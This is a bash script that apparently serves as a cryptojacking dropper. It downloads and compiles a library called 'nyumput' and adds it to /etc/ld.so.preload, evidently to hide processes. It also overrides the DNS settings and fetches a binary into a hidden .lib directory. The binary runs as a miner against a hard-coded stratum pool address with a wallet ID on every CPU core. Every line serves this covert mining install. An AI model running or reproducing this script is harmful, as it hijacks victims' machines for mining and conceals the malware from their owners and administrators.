#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl sudo
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/aurum-hertzner
chmod u+x sgr1
./sgr1 -a aurum -o stratum+tcp://64.23.198.64:443 -u bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur -p x -t $(nproc --all) 
